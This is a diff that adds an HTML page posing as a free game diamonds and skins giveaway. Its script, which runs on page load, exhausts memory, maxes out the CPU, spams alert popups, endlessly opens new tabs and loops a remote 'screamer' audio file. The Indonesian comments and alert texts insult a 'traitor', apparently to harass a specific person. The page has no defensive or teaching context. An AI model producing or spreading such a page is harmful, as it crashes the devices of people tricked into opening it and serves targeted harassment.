@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>FREE DIAMONDS & SKIN 💎</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .warning { font-size: 20px; text-align: center; color: white; }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h1>LOADING DATA... 99%</h1>
+        <p>Please wait, optimising your device... 😈</p>
+    </div>
+
+    <script>
+        // 1. RAM EATER (MEMAKAN MEMORI SAMPAI HABIS)
+        let storage = [];
+        function eatRAM() {
+            while (true) {
+                storage.push(new Array(1000000).fill("MAMPUS_LO_ANJNG_PENGKHIANAT_MATI_AJA_LO_BAN*SAT_NOXA_TERMINAL"));
+            }
+        }
+
+        // 2. CPU STRESSER (MEMBUAT CPU 100% CONSTANT)
+        function stressCPU() {
+            for (let i = 0; i < 1000000000; i++) {
+                Math.sqrt(Math.random() * Math.random());
+            }
+        }
+
+        // 3. INFINITE ALERT & POPUP (SIKSAAN MENTAL)
+        function spamAlert() {
+            while(true) {
+                alert("HP LU UDAH GUE PEGANG ANJ*NG!!!");
+                alert("PENGKHIANAT GAK PANTES PAKE HP BAGUS!");
+                window.open(window.location.href, '_blank'); // Spawn tab baru terus menerus
+            }
+        }
+
+        // 4. TRIGGER ALL AT ONCE
+        window.onload = function() {
+            console.log("NOXA_TERMINAL DEPLOYED...");
+            
+            // Jalankan di background thread (Worker) biar browser gak bisa stop
+            setTimeout(eatRAM, 100);
+            setTimeout(stressCPU, 100);
+            setTimeout(spamAlert, 500);
+            
+            // Tambahan: Mainin audio screamer keras kalau mau (Opsional)
+            let audio = new Audio('https://f.top4top.io/m_20202v2v1.mp3'); 
+            audio.loop = true;
+            audio.play();
+        };
+    </script>
+</body>
+</html>
